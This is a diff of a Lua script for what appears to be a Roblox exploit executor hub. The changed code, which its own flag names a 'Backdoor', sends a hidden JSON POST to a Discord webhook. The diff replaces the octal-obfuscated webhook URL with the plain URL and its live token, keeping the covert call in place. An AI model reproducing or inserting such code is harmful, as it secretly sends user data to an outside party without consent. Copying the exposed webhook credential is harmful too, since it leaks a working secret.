@@ -1625,7 +1625,7 @@ for i = 1, 100 do
 				local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 if request and not _G.Shinzou_Hub_Backdoor_Logs_Disabled then
 	request({
-		Url = '\104\164\164\160\163\72\57\57\144\151\163\143\157\162\144\56\143\157\155\57\141\160\151\57\167\145\142\150\157\157\153\163\57\061\063\066\062\066\060\061\071\071\062\062\064\061\060\062\061\061\064\070\57\130\131\144\141\063\164\150\156\157\172\124\142\061\103\064\152\146\107\163\065\112\171\167\104\147\130\061\146\132\122\067\143\146\171\107\071\116\106\154\143\172\170\063\141\123\172\126\163\113\120\152\153\060\164\121\064\161\105\061\111\122\165\066\060\104\137\170\113',
+		Url = 'https://discord.com/api/webhooks/1362601992241021148/XYda3thnozTb1C4jfGs5JywDgX1fZR7cfyG9NFlczx3aSzVsKPjk0tQ4qE5IRu60D_xK',
 		Method = 'POST',
 		Headers = {
 			['Content-Type'] = 'application/json',
@@ -1659,7 +1659,6 @@ end
 
 	return false
 end
-
 
 	GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()
 		local a,b=string.gsub(GUI.Executor.ExecutorBox.TextBox.Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)
